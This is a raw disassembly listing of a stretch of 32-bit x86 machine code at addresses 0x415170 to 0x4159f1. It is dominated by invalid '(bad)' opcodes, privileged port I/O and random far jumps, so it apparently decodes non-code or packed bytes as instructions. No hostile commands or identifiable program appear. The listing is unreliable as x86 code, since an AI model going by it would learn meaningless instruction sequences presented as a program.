  415170:	xor    BYTE PTR [esi+0x729a4ab9],bl
  415176:	add    al,BYTE PTR [ebx]
  415178:	cli    
  415179:	inc    edi
  41517a:	add    eax,0x3a98c8a9
  41517f:	ds imul eax,esp,0xa89ce893
  415186:	pop    eax
  415187:	arpl   WORD PTR [esi],bp
  415189:	pop    eax
  41518a:	sub    al,0x10
  41518c:	push   ss
  41518d:	(bad)  
  41518e:	clc    
  41518f:	cli    
  415190:	mov    eax,ds:0x3ef350af
  415195:	and    BYTE PTR [eax+0x2a94e401],dl
  41519b:	fisubr WORD PTR [ebx]
  41519d:	cwde   
  41519e:	inc    ebp
  41519f:	cmp    cl,al
  4151a1:	sbb    ebp,DWORD PTR [eax+0x2d88c111]
  4151a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151a8:	jmp    0xed22de45
  4151ad:	inc    ecx
  4151ae:	aaa    
  4151af:	mov    dh,0x8e
  4151b1:	dec    eax
  4151b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151b3:	inc    esp
  4151b4:	fmul   st,st(3)
  4151b6:	sti    
  4151b7:	mov    edx,0x37536e43
  4151bc:	and    dl,bl
  4151be:	add    al,0x6b
  4151c0:	mov    ebx,0xd0e32d74
  4151c5:	mov    bh,0xf1
  4151c7:	pusha  
  4151c8:	nop
  4151c9:	inc    edi
  4151ca:	(bad)  
  4151cb:	lods   eax,DWORD PTR ds:[esi]
  4151cc:	scas   al,BYTE PTR es:[edi]
  4151cd:	sysenter 
  4151cf:	in     al,0x9d
  4151d1:	retf   
  4151d2:	cmp    DWORD PTR [eax],esi
  4151d4:	out    dx,al
  4151d5:	(bad)  
  4151d6:	mov    DWORD PTR es:[ecx],ebx
  4151d9:	and    eax,0xd91d3a6a
  4151de:	jo     0x41521c
  4151e0:	pop    es
  4151e1:	inc    eax
  4151e2:	xchg   edi,eax
  4151e3:	leave  
  4151e4:	xchg   bh,bl
  4151e6:	mov    al,ds:0x2e53f370
  4151eb:	inc    edi
  4151ec:	mov    cl,0x17
  4151ee:	sub    BYTE PTR [eax+0x3c7d95cd],cl
  4151f4:	add    BYTE PTR [ecx-0xf],0x7
  4151f8:	sbb    bl,dh
  4151fa:	int    0x25
  4151fc:	out    dx,eax
  4151fd:	jp     0x415265
  4151ff:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  415201:	mov    edi,DWORD PTR [eax-0x32]
  415204:	iret   
  415205:	xchg   esp,eax
  415206:	mov    ds:0xb9a1c2ed,eax
  41520b:	enter  0x3b70,0xd4
  41520f:	adc    BYTE PTR [esi+0x272517eb],dl
  415215:	(bad)  
  415217:	mov    WORD PTR [esi],ds
  415219:	pop    ebp
  41521a:	test   BYTE PTR [edx],bl
  41521c:	xchg   cl,bh
  41521e:	xor    eax,0x62ccaa22
  415223:	push   esp
  415224:	dec    esi
  415225:	and    ebx,DWORD PTR [ecx+ebx*4]
  415228:	in     al,0xa9
  41522a:	add    edx,DWORD PTR [ebp-0x6]
  41522d:	aam    0x9b
  41522f:	mov    eax,ds:0x58fe1e33
  415234:	int    0xe0
  415236:	scas   eax,DWORD PTR es:[edi]
  415237:	sub    al,0x6b
  415239:	fnsave [ebx-0x6f]
  41523c:	mov    ebp,0xba728d27
  415241:	dec    DWORD PTR [edi+0x22]
  415244:	lahf   
  415245:	push   esi
  415246:	inc    ebp
  415247:	sbb    DWORD PTR [esi],0x351590c5
  41524d:	mov    esp,DWORD PTR [ecx+0x50f9c82a]
  415253:	cs jmp 0xe82060e7
  415259:	fmul   DWORD PTR [edx-0xf]
  41525c:	xchg   ebp,eax
  41525d:	pop    ebp
  41525e:	mov    ebp,DWORD PTR [ebx-0x7f1db193]
  415264:	xchg   ecx,eax
  415265:	mov    ch,ch
  415267:	dec    ebp
  415268:	mov    al,ds:0xb4b2538a
  41526d:	inc    esi
  41526e:	mov    ebp,0x1f67fd9c
  415273:	xor    al,0x94
  415275:	push   ss
  415276:	scas   al,BYTE PTR es:[edi]
  415277:	stc    
  415278:	retf   
  415279:	mov    ch,0xab
  41527b:	dec    eax
  41527c:	sbb    eax,0x18c5b891
  415281:	jns    0x4152b5
  415283:	stos   DWORD PTR es:[edi],eax
  415284:	aas    
  415285:	xor    eax,0xcd8d5fba
  41528a:	inc    esi
  41528b:	jo     0x415244
  41528d:	or     DWORD PTR es:[ebp-0x4414592],esi
  415294:	std    
  415295:	sbb    bh,BYTE PTR [eax]
  415297:	or     DWORD PTR [ecx+0x26],eax
  41529a:	sub    ah,BYTE PTR ds:0x8b883c41
  4152a0:	pop    edx
  4152a1:	mov    ebx,DWORD PTR [ebp-0x3b304e4]
  4152a7:	fisttp QWORD PTR [esi+esi*1-0x4a15b589]
  4152ae:	inc    ebx
  4152af:	js     0x415267
  4152b1:	out    0x96,eax
  4152b3:	cli    
  4152b4:	(bad)  
  4152b5:	push   ebx
  4152b6:	arpl   WORD PTR [esi+eax*1-0x5e83488d],dx
  4152bd:	scas   al,BYTE PTR es:[edi]
  4152be:	add    ebp,ebx
  4152c0:	push   ebp
  4152c1:	addr16 jbe 0x41526d
  4152c4:	in     eax,0x2b
  4152c6:	cld    
  4152c7:	xchg   ecx,eax
  4152c8:	jmp    0x4b673df0
  4152cd:	call   0xa259:0x60cf55fa
  4152d4:	test   eax,0x1178e73a
  4152d9:	scas   eax,DWORD PTR es:[edi]
  4152da:	xor    BYTE PTR [edx+0x6405970d],0x3e
  4152e1:	in     eax,dx
  4152e2:	push   es
  4152e3:	mov    ah,0x90
  4152e5:	ret    
  4152e6:	mov    edx,0x2d527e2f
  4152eb:	mov    eax,ds:0x300fa8ca
  4152f0:	jmp    0x5fe4:0x32082118
  4152f7:	inc    ebp
  4152f8:	xlat   BYTE PTR ds:[ebx]
  4152f9:	push   cs
  4152fa:	pop    ebp
  4152fb:	mov    ds:0xc9b5b815,al
  415300:	clc    
  415301:	mov    ebx,0x8a059c61
  415306:	cli    
  415307:	ret    0x464c
  41530a:	mov    gs,ebx
  41530c:	icebp  
  41530d:	adc    DWORD PTR [ecx+0x22],ebx
  415310:	mov    ebp,0x4b347aba
  415315:	cwde   
  415316:	cdq    
  415317:	push   0x55d90d4
  41531c:	mov    ds:0xdcce8813,al
  415321:	out    dx,eax
  415322:	pminsw mm2,mm0
  415325:	clc    
  415326:	jne    0x4152e5
  415328:	ret    0xb8bd
  41532b:	push   ss
  41532c:	leave  
  41532d:	xchg   ecx,eax
  41532e:	int    0x78
  415330:	or     BYTE PTR [edi+edi*1+0x291f29fb],cl
  415337:	cmp    DWORD PTR [ebp-0xe2a11e6],ebp
  41533d:	pop    eax
  41533e:	mov    dl,0xcd
  415340:	enter  0x3144,0x4d
  415344:	inc    ebx
  415345:	(bad)  
  415346:	pop    ss
  415347:	imul   esp,DWORD PTR [ecx+0x14],0xe
  41534b:	add    ebx,ebp
  41534d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41534e:	into   
  41534f:	mov    esp,0x42d772c7
  415354:	xchg   esp,eax
  415355:	add    esi,DWORD PTR [esi+0xa]
  415358:	fnstsw WORD PTR [edi-0x11f7496a]
  41535e:	inc    edx
  41535f:	icebp  
  415360:	ins    DWORD PTR es:[edi],dx
  415361:	sbb    al,0x75
  415363:	or     DWORD PTR [ebx-0x3b],eax
  415366:	retf   
  415367:	retf   0xe6a4
  41536a:	xor    al,0xad
  41536c:	in     eax,0x39
  41536e:	sub    al,0x5a
  415370:	and    dh,BYTE PTR [ecx]
  415372:	ror    DWORD PTR [edi+0x7ce0a038],1
  415378:	fs pop esp
  41537a:	cld    
  41537b:	push   eax
  41537c:	push   edi
  41537d:	inc    ebx
  41537e:	or     BYTE PTR [ebx+0x22],dh
  415381:	test   esp,eax
  415383:	sbb    BYTE PTR [ecx],al
  415385:	mov    al,0xa0
  415387:	stos   BYTE PTR es:[edi],al
  415388:	popa   
  415389:	adc    bh,BYTE PTR [esi+0x3c]
  41538c:	loopne 0x415364
  41538e:	add    BYTE PTR [ebp+0x44],0x54
  415392:	retf   0x7547
  415395:	call   0x36a5b1a
  41539a:	ror    DWORD PTR [esi-0x23d66a01],1
  4153a0:	sub    ch,ch
  4153a2:	sub    BYTE PTR [ecx+0x50],ch
  4153a5:	jno    0x41532d
  4153a7:	and    ebx,DWORD PTR [edi]
  4153a9:	mov    ch,ch
  4153ab:	mov    dl,0xaa
  4153ad:	sub    DWORD PTR [eax+0xfcd666b],ecx
  4153b3:	mov    ecx,0xbd953796
  4153b8:	adc    DWORD PTR [esi+eiz*8],0x3335e0f9
  4153bf:	dec    esi
  4153c0:	fdiv   QWORD PTR [ebx-0x57057446]
  4153c6:	test   eax,0x24860821
  4153cb:	xchg   edi,eax
  4153cc:	inc    ebp
  4153cd:	dec    esi
  4153ce:	cli    
  4153cf:	ficomp DWORD PTR [ebx-0x63bbe0e6]
  4153d5:	jmp    0x4199:0x209058ec
  4153dc:	shl    al,1
  4153de:	pop    ecx
  4153df:	jge    0x415438
  4153e1:	in     eax,dx
  4153e2:	pop    ecx
  4153e3:	cmp    esp,DWORD PTR [eax+0x4408b96a]
  4153e9:	sub    BYTE PTR [ecx+0x2922edc1],ch
  4153ef:	loope  0x4153ab
  4153f1:	cld    
  4153f2:	push   ecx
  4153f3:	pop    esi
  4153f4:	std    
  4153f5:	retf   
  4153f6:	mov    edx,0x9262072
  4153fb:	lahf   
  4153fc:	les    esi,FWORD PTR [edi]
  4153fe:	das    
  4153ff:	lock push ecx
  415401:	mov    cl,0x31
  415403:	sahf   
  415404:	dec    esi
  415405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415406:	aam    0x6b
  415408:	mov    eax,ds:0x6bcc1c63
  41540d:	adc    BYTE PTR [esi-0x2bb1df6b],dh
  415413:	mov    ds:0x5f5382c7,eax
  415418:	pop    ebx
  415419:	(bad)  
  41541a:	xchg   edi,eax
  41541b:	xor    BYTE PTR [edi+0x6ff69c33],dl
  415421:	ins    BYTE PTR es:[edi],dx
  415422:	cs retf 
  415424:	pop    ecx
  415425:	mov    dh,0xa2
  415427:	loope  0x415402
  415429:	sbb    eax,0x85f47605
  41542e:	gs adc al,0x7d
  415431:	cmp    bl,BYTE PTR [edx-0x38]
  415434:	lock jnp 0x415483
  415437:	fcomp  QWORD PTR [ebx]
  415439:	lds    eax,FWORD PTR [ebx]
  41543b:	fwait
  41543c:	pop    edx
  41543d:	out    dx,al
  41543e:	dec    edi
  41543f:	mov    dh,0x3b
  415441:	dec    ecx
  415442:	mov    al,0x89
  415444:	sub    eax,0xe7c382ca
  415449:	pop    ebx
  41544a:	loope  0x415455
  41544c:	xchg   ebp,eax
  41544d:	rcr    BYTE PTR [ebp-0x5a3aaa48],1
  415453:	add    eax,0x23342897
  415458:	fmul   DWORD PTR [esp+ebx*4]
  41545b:	outs   dx,BYTE PTR ds:[esi]
  41545c:	sub    cl,BYTE PTR [ebp-0x899710c]
  415462:	inc    eax
  415463:	sbb    DWORD PTR [edi],eax
  415465:	push   es
  415466:	lea    ebx,[edi-0x4b46ed51]
  41546c:	sbb    ch,BYTE PTR [ebx]
  41546e:	pop    edx
  41546f:	aad    0x15
  415471:	call   0x3104:0x636f6634
  415478:	in     al,dx
  415479:	call   0x8d351705
  41547e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41547f:	push   esi
  415480:	lods   eax,DWORD PTR ds:[esi]
  415481:	push   ebp
  415482:	adc    eax,0x1d34801a
  415487:	into   
  415488:	test   esi,esi
  41548a:	mov    dl,0xa1
  41548c:	js     0x4154c9
  41548e:	loope  0x415422
  415490:	push   0x2e
  415492:	dec    ebx
  415493:	mov    ds:0x704e17,al
	...
  415514:	outs   dx,DWORD PTR ds:[esi]
  415515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415516:	daa    
  415517:	jbe    0x415508
  415519:	idiv   DWORD PTR [edi-0x43]
  41551c:	mov    ecx,0xb616f8af
  415521:	adc    eax,0xfa8549d6
  415526:	add    BYTE PTR [eax],al
  415528:	imul   eax,DWORD PTR [edi],0x0
  41552b:	add    BYTE PTR [edx],ah
  41552d:	pop    es
  41552e:	mov    ebp,0x848772cc
  415533:	out    dx,eax
  415534:	xchg   edx,eax
  415535:	cmc    
  415536:	(bad)  
  415537:	cld    
  415538:	push   edi
  415539:	popa   
  41553a:	or     DWORD PTR [ebx*1-0x4826166a],0x43f781fc
  415545:	inc    edi
  415546:	mov    BYTE PTR [edx],ch
  415548:	adc    ebp,DWORD PTR [edx+0x52e91718]
  41554e:	cmp    DWORD PTR [ebx+edi*1-0x1e2d1ef5],ecx
  415555:	mov    ds:0xec9b35d,al
  41555a:	and    BYTE PTR [eax],0xd6
  41555d:	cmp    DWORD PTR ds:[eax],esp
  415560:	aam    0x36
  415562:	ins    DWORD PTR es:[edi],dx
  415563:	pop    eax
  415564:	sbb    BYTE PTR [ebx-0x58],cl
  415567:	pusha  
  415568:	push   esi
  415569:	test   BYTE PTR [eax-0x9],ah
  41556c:	pop    edi
  41556d:	xor    al,0x98
  41556f:	les    edx,FWORD PTR [edi-0x7f]
  415572:	cmp    BYTE PTR [eax-0x29],dl
  415575:	mov    al,0x96
  415577:	nop
  415578:	or     BYTE PTR [edx-0x3459917b],bl
  41557e:	jl     0x4155d0
  415580:	mov    ds:0xf0f99d4a,al
  415585:	enter  0xafe5,0xa7
  415589:	mov    cl,0x5e
  41558b:	adc    ebx,DWORD PTR [eax+esi*4]
  41558e:	das    
  41558f:	scas   al,BYTE PTR es:[edi]
  415590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415591:	int    0x9c
  415593:	mov    DWORD PTR [ecx+0x5b],ebx
  415596:	shr    DWORD PTR [edi],cl
  415598:	and    ah,bl
  41559a:	xor    BYTE PTR ds:0xf059,dl
  41559f:	mov    DWORD PTR [ebx-0x2e9b7f7],0xb559dd55
  4155a9:	pop    edi
  4155aa:	adc    BYTE PTR [ecx+0x61367916],0xc8
  4155b1:	jo     0x41558b
  4155b3:	lods   eax,DWORD PTR ds:[esi]
  4155b4:	ror    BYTE PTR [ebp+0x25],0x27
  4155b8:	adc    ah,BYTE PTR [esi-0x1041139b]
  4155be:	sub    bh,bh
  4155c0:	in     al,dx
  4155c1:	out    0xe1,eax
  4155c3:	pop    ebp
  4155c4:	fwait
  4155c5:	stos   DWORD PTR es:[edi],eax
  4155c6:	stos   DWORD PTR es:[edi],eax
  4155c7:	inc    ebx
  4155c8:	cdq    
  4155c9:	in     al,dx
  4155ca:	push   eax
  4155cb:	(bad)  
  4155cc:	retf   0x8ab7
  4155cf:	add    al,0xe
  4155d1:	and    eax,0xd163ef37
  4155d6:	mov    bl,0x19
  4155d8:	push   ebp
  4155d9:	in     al,dx
  4155da:	loop   0x415596
  4155dc:	bound  esp,QWORD PTR [ebp-0x10]
  4155df:	xchg   ebx,eax
  4155e0:	adc    al,0x3c
  4155e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155e3:	add    ah,BYTE PTR [ebx+ecx*4]
  4155e6:	fdiv   DWORD PTR [edi+0x346f122f]
  4155ec:	push   edx
  4155ed:	sub    DWORD PTR [ebx+0x5779be0b],esi
  4155f3:	or     DWORD PTR [edi+eax*4+0x7491995c],eax
  4155fa:	adc    edi,DWORD PTR [ecx-0x151d9a19]
  415600:	mov    eax,DWORD PTR [edx-0x208a5d30]
  415606:	fs and al,0xdf
  415609:	loopne 0x41566e
  41560b:	jmp    0x7a8d03d9
  415610:	imul   ebx,DWORD PTR [ebp-0x394c3905],0xeb14379a
  41561a:	mov    BYTE PTR [ebp-0x9056f68],ch
  415620:	pop    edx
  415621:	push   es
  415622:	jb     0x415612
  415624:	xlat   BYTE PTR ds:[ebx]
  415625:	sub    bl,BYTE PTR [ecx+0x727f8745]
  41562b:	out    0x2e,al
  41562d:	cmc    
  41562e:	sbb    BYTE PTR [eax+0x43dd837c],dl
  415634:	xor    edx,DWORD PTR [edi-0x288ea6e8]
  41563a:	push   esp
  41563b:	sub    BYTE PTR [ecx-0x62],0xf
  41563f:	clc    
  415640:	push   0xffffffd3
  415642:	je     0x41562a
  415644:	mov    al,ds:0x4126d59c
  415649:	pop    es
  41564a:	mov    ds:0x39bf1702,al
  41564f:	mov    ch,0x34
  415651:	fs cli 
  415653:	sub    DWORD PTR [edi],ecx
  415655:	(bad)  
  415656:	pop    edi
  415657:	aaa    
  415658:	fbld   TBYTE PTR [esi-0x36]
  41565b:	je     0x415611
  41565d:	dec    ebp
  41565e:	sahf   
  41565f:	mov    esp,0xf25f0939
  415664:	jle    0x4156c8
  415666:	adc    DWORD PTR [eax-0x4e616076],ebx
  41566c:	out    dx,eax
  41566d:	sbb    cl,BYTE PTR [edx+0x1aa23323]
  415673:	mov    al,ds:0x5cf31852
  415678:	retf   0x7101
  41567b:	in     al,0x95
  41567d:	pop    ebx
  41567e:	jo     0x41562e
  415680:	push   esp
  415681:	pop    ebp
  415682:	sub    al,ah
  415684:	or     cl,dl
  415686:	mov    al,ds:0x96f9c593
  41568b:	repnz adc eax,0x77651263
  415691:	call   0x88139b4a
  415696:	xchg   edx,eax
  415697:	cmc    
  415698:	lock push ebp
  41569a:	div    bh
  41569c:	adc    eax,0x7947f51d
  4156a1:	add    DWORD PTR [ebp+ecx*2+0xf],edi
  4156a5:	pop    es
  4156a6:	scas   al,BYTE PTR es:[edi]
  4156a7:	and    BYTE PTR ds:0x4fa53382,0xfc
  4156ae:	enter  0x9ab4,0xc0
  4156b2:	fistp  WORD PTR [ecx+ebp*8]
  4156b5:	std    
  4156b6:	scas   eax,DWORD PTR es:[edi]
  4156b7:	and    al,0x6b
  4156b9:	test   BYTE PTR [edx+eax*1+0x3438a608],bl
  4156c0:	mov    ebp,0x851bcac1
  4156c5:	repz int3 
  4156c7:	cmc    
  4156c8:	push   ecx
  4156c9:	lea    edi,[edx-0x3fbe10ca]
  4156cf:	cmp    al,0x2
  4156d1:	push   ebx
  4156d2:	call   0x2516:0x3c93a13f
  4156d9:	shl    DWORD PTR [ecx+edx*8+0x402d6903],0xbe
  4156e1:	and    eax,0x7b12a19b
  4156e6:	leave  
  4156e7:	ins    DWORD PTR es:[edi],dx
  4156e8:	popf   
  4156e9:	dec    ecx
  4156ea:	and    ebx,ecx
  4156ec:	lods   eax,DWORD PTR ds:[esi]
  4156ed:	jbe    0x41571a
  4156ef:	leave  
  4156f0:	push   es
  4156f1:	es push es
  4156f3:	pop    edi
  4156f4:	je     0x4156cd
  4156f6:	sub    edi,ecx
  4156f8:	scas   eax,DWORD PTR es:[edi]
  4156f9:	pop    esi
  4156fa:	xchg   esi,eax
  4156fb:	sbb    DWORD PTR [eax],eax
  4156fd:	jo     0x41569d
  4156ff:	xchg   BYTE PTR ss:[esi-0x35389a93],cl
  415706:	out    dx,al
  415707:	adc    esp,DWORD PTR [edi+ebp*2]
  41570a:	pop    esp
  41570b:	repnz std 
  41570d:	mov    bl,0xa8
  41570f:	and    ah,BYTE PTR [ecx-0x6cf10aa0]
  415715:	add    DWORD PTR [edx],0xedc47d26
  41571b:	and    dl,ch
  41571d:	prefetchw BYTE PTR [ecx+0x70]
  415721:	jbe    0x41575c
  415723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415724:	pop    esi
  415725:	pop    esi
  415726:	xor    BYTE PTR [ecx+0x69],0xe7
  41572a:	das    
  41572b:	into   
  41572c:	and    eax,DWORD PTR [ebx]
  41572e:	dec    ebx
  41572f:	mov    ebp,0x87f95f64
  415734:	rcr    DWORD PTR [ebp+esi*8+0x7e],cl
  415738:	fimul  WORD PTR [ecx]
  41573a:	mov    cl,0x31
  41573c:	dec    ebx
  41573d:	cmp    al,0xac
  41573f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415740:	rcl    BYTE PTR [ebx],1
  415742:	cmc    
  415743:	into   
  415744:	dec    edx
  415745:	jo     0x4157b7
  415747:	hlt    
  415748:	add    DWORD PTR [edx-0x7a],0x26fdd910
  41574f:	add    al,0x19
  415751:	(bad)  
  415752:	cli    
  415753:	add    eax,0xc6bf794f
  415758:	mov    fs,ebx
  41575a:	adc    DWORD PTR [ebx+0x2e1c9b15],edi
  415760:	lods   eax,DWORD PTR ds:[esi]
  415761:	imul   edx,esi,0xffffffab
  415764:	add    al,0x46
  415766:	jns    0x415797
  415768:	nop
  415769:	sub    al,ch
  41576b:	jl     0x4157d8
  41576d:	pop    edx
  41576e:	xor    esi,DWORD PTR [edx+0x33d0f5c7]
  415774:	add    bl,BYTE PTR [edi-0x3232ade3]
  41577a:	ffreep st(3)
  41577c:	pop    ecx
  41577d:	jl     0x415738
  41577f:	inc    ebp
  415780:	push   ebp
  415781:	les    edi,FWORD PTR [ecx+0x1a6f3182]
  415787:	mov    ds:0xc0111bfc,eax
  41578c:	mov    ds:0x59ea2513,al
  415791:	sub    al,0xc0
  415793:	pusha  
  415794:	stos   BYTE PTR es:[edi],al
  415795:	call   0x4a43:0x68d1fd6e
  41579c:	nop
  41579d:	xlat   BYTE PTR ds:[ebx]
  41579e:	(bad)  
  41579f:	jmp    0xc309712c
  4157a4:	sub    al,0x65
  4157a6:	cwde   
  4157a7:	xchg   ebx,eax
  4157a8:	in     al,0x14
  4157aa:	pop    ds
  4157ab:	xchg   edx,eax
  4157ac:	sub    ch,BYTE PTR [ebx]
  4157ae:	push   0xffffff86
  4157b0:	push   0x6fecd48c
  4157b5:	add    DWORD PTR [edi+0x56],edx
  4157b8:	and    al,0x4c
  4157ba:	dec    edi
  4157bb:	retf   
  4157bc:	pop    edx
  4157bd:	xor    dh,0x7b
  4157c0:	push   esi
  4157c1:	ins    BYTE PTR es:[edi],dx
  4157c2:	dec    ebx
  4157c3:	aaa    
  4157c4:	leave  
  4157c5:	inc    eax
  4157c6:	or     ah,dh
  4157c8:	loop   0x415804
  4157ca:	xor    BYTE PTR [ecx],dl
  4157cc:	js     0x4157fb
  4157ce:	mov    dh,0x21
  4157d0:	outs   dx,BYTE PTR ds:[esi]
  4157d1:	fwait
  4157d2:	push   cs
  4157d3:	fisubr DWORD PTR cs:[ebx]
  4157d6:	in     eax,0xf5
  4157d8:	jecxz  0x4157bc
  4157da:	ins    DWORD PTR es:[edi],dx
  4157db:	push   eax
  4157dc:	mov    esi,0xe9701644
  4157e1:	jg     0x4157fd
  4157e3:	xchg   BYTE PTR [edx],bh
  4157e5:	cmp    BYTE PTR [ecx-0x6c],al
  4157e8:	cli    
  4157e9:	dec    eax
  4157ea:	adc    DWORD PTR [ebp-0x60],ebx
  4157ed:	mov    bl,BYTE PTR [ebx]
  4157ef:	fistp  WORD PTR [esi]
  4157f1:	(bad)  
  4157f2:	cmp    esi,DWORD PTR [esi+edi*2+0x63e3eb65]
  4157f9:	stc    
  4157fa:	stos   BYTE PTR es:[edi],al
  4157fb:	(bad)  
  4157fc:	enter  0xe7c,0x47
  415800:	loopne 0x4157d4
  415802:	or     DWORD PTR [ebx+0xe8bb24],esp
  415808:	mov    edx,0x3f1a32eb
  41580d:	add    ebp,DWORD PTR [esi-0x4b]
  415810:	xor    eax,0x3de88d7
  415815:	fst    st(0)
  415817:	sub    edx,DWORD PTR [edi+edx*4+0x6882763e]
  41581e:	(bad)
  415821:	pop    ds
  415822:	mov    BYTE PTR [ecx],0x93
  415825:	dec    edx
  415826:	mov    esi,0xcb72f8fc
  41582b:	xor    al,0x82
  41582d:	push   0x1abfb99a
  415832:	or     esi,DWORD PTR [ecx+0xf938665]
  415838:	jmp    0x351cbb27
  41583d:	dec    esp
  41583e:	push   es
  41583f:	jo     0x415836
  415841:	dec    edi
  415842:	or     bl,al
  415844:	loope  0x4158b3
  415846:	xchg   dl,dh
  415848:	enter  0x9ab6,0x63
  41584c:	jno    0x41586e
  41584e:	mov    ds:0xa22d9bce,eax
  415853:	ds pop edi
  415855:	mov    ch,0x4
  415857:	pop    esi
  415858:	xchg   esp,eax
  415859:	add    al,0xa0
  41585b:	xchg   esp,eax
  41585c:	xor    edx,DWORD PTR [edi+0x70]
  41585f:	pop    eax
  415860:	mov    ebp,0x3acd5ee2
  415865:	jle    0x415893
  415867:	popf   
  415868:	mov    al,ds:0x3ae2c352
  41586d:	ret    
  41586e:	rcr    DWORD PTR ss:[ebx+0x75],cl
  415872:	xor    eax,0x3692fa35
  415877:	mov    bh,0x33
  415879:	fwait
  41587a:	popa   
  41587b:	xor    BYTE PTR [ecx],ch
  41587d:	test   BYTE PTR [ebp+0xa],0xa9
  415881:	(bad)  
  415882:	leave  
  415883:	imul   eax,DWORD PTR [eax+0x73fff983],0x30
  41588a:	dec    eax
  41588b:	data16 cmpxchg BYTE PTR [esi-0x5c],dh
  415890:	cdq    
  415891:	dec    ecx
  415892:	pop    ds
  415893:	or     bl,BYTE PTR [edi+edi*1]
  415896:	pop    ebx
  415897:	imul   esi,esi,0x4c91aaae
  41589d:	loopne 0x415876
  41589f:	jg     0x41591c
  4158a1:	push   0x84beb8b0
  4158a6:	stos   BYTE PTR es:[edi],al
  4158a7:	pusha  
  4158a8:	push   0xfffffff3
  4158aa:	int    0xfd
  4158ac:	mov    cl,dh
  4158ae:	rol    al,cl
  4158b0:	jmp    0x415875
  4158b2:	xchg   bh,cl
  4158b4:	add    eax,0x3eb260ac
  4158b9:	data16 icebp 
  4158bb:	mov    ecx,0x43ee8fc2
  4158c0:	jecxz  0x41586a
  4158c2:	and    al,BYTE PTR [eax-0x43bb94e9]
  4158c8:	push   ecx
  4158c9:	xchg   ebx,eax
  4158ca:	scas   al,BYTE PTR es:[edi]
  4158cb:	xor    bh,bh
  4158cd:	jle    0x4158e8
  4158cf:	gs ds cwde 
  4158d2:	test   al,0x86
  4158d4:	push   0xffffff85
  4158d6:	rol    DWORD PTR [ebx+0x14],0x31
  4158da:	iret   
  4158db:	xor    eax,0xb4c007dc
  4158e0:	stos   DWORD PTR es:[edi],eax
  4158e1:	les    ecx,FWORD PTR [ebx+eax*1+0x37]
  4158e5:	pop    eax
  4158e6:	shr    DWORD PTR ds:0xb658a75e,0xae
  4158ed:	sbb    ch,cl
  4158ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158f0:	inc    esp
  4158f1:	out    0x79,eax
  4158f3:	push   ecx
  4158f4:	dec    ebp
  4158f5:	inc    edx
  4158f6:	aaa    
  4158f7:	mov    eax,esp
  4158f9:	xchg   esi,eax
  4158fa:	mov    cl,0xf8
  4158fc:	imul   ebx,DWORD PTR [edi+0x18e9d6d7],0xffffffde
  415903:	jle    0x41589a
  415905:	dec    edx
  415906:	rcr    BYTE PTR [esp+ecx*8],1
  415909:	inc    eax
  41590a:	adc    eax,0xb4d000ac
  41590f:	cmc    
  415910:	or     esi,DWORD PTR [edi-0x57c62dcd]
  415916:	cli    
  415917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415918:	dec    edx
  415919:	imul   ecx,DWORD PTR [edx-0x51ab8a27],0x83cb3e4d
  415923:	adc    dl,0xfc
  415926:	adc    BYTE PTR [ebx-0x439e8f73],cl
  41592c:	inc    esp
  41592d:	iret   
  41592e:	jae    0x4158c3
  415930:	jle    0x41590d
  415932:	call   0xd3a68df4
  415937:	mov    edx,0x85a99f22
  41593c:	call   0x38c4:0xf4eb6689
  415943:	into   
  415944:	inc    esp
  415945:	mov    ebp,edx
  415947:	idiv   DWORD PTR [ebx+0x3b]
  41594a:	or     cl,bl
  41594c:	out    dx,al
  41594d:	(bad)  
  41594e:	and    al,0x79
  415950:	push   ds
  415951:	push   es
  415952:	cmp    bh,0x91
  415955:	test   al,0x68
  415957:	inc    ebp
  415958:	inc    edx
  415959:	sar    ecx,0xe7
  41595c:	pop    es
  41595d:	cmp    BYTE PTR [ebp-0x49],bl
  415960:	mov    dl,0xae
  415962:	fnstenv ds:0x6c0ce601
  415968:	cdq    
  415969:	shr    eax,1
  41596b:	ss call 0xdf810f56
  415971:	pop    esi
  415972:	retf   0xd71d
  415975:	xchg   BYTE PTR [ebp-0x27],dh
  415978:	mov    bh,0x3a
  41597a:	add    edx,DWORD PTR [edi+0x29]
  41597d:	mov    bl,0xa6
  41597f:	ja     0x415967
  415981:	cmc    
  415982:	in     eax,0xa1
  415984:	push   ebx
  415985:	out    dx,eax
  415986:	daa    
  415987:	push   edi
  415988:	std    
  415989:	loopne 0x4159e1
  41598b:	call   0x50db:0x231ee99
  415992:	push   es
  415993:	das    
  415994:	mov    DWORD PTR [ecx],eax
  415996:	leave  
  415997:	jbe    0x415973
  415999:	pusha  
  41599a:	sbb    bh,0x37
  41599d:	mov    ebx,0x38b95d1f
  4159a2:	mov    esi,0x2c19c8b7
  4159a7:	mov    esp,0xa7367c5e
  4159ac:	test   eax,0x70154ef2
  4159b1:	in     al,0xca
  4159b3:	jmp    0x6b0654ce
  4159b8:	sub    BYTE PTR [ecx],0xe5
  4159bb:	out    0xd0,eax
  4159bd:	inc    ebx
  4159be:	mov    DWORD PTR ds:0x5439d2d0,eax
  4159c4:	imul   esi,DWORD PTR [edi+0x1e],0x8a062090
  4159cb:	mov    dl,0x65
  4159cd:	inc    eax
  4159ce:	mov    ah,0x7b
  4159d0:	out    0xd4,al
  4159d2:	mov    cl,dh
  4159d4:	push   ss
  4159d5:	lods   al,BYTE PTR ds:[esi]
  4159d6:	mov    ebp,0xe79693d6
  4159db:	pop    eax
  4159dc:	pop    ebx
  4159dd:	push   edx
  4159de:	adc    eax,0x1a115884
  4159e3:	and    al,0x96
  4159e5:	lods   eax,DWORD PTR ds:[esi]
  4159e6:	pop    eax
  4159e7:	in     eax,dx
  4159e8:	iret   
  4159e9:	jno    0x4159a1
  4159eb:	cmp    DWORD PTR [edi+edx*1+0x1e],eax
  4159ef:	or     ebp,esi
  4159f1:	(bad)  
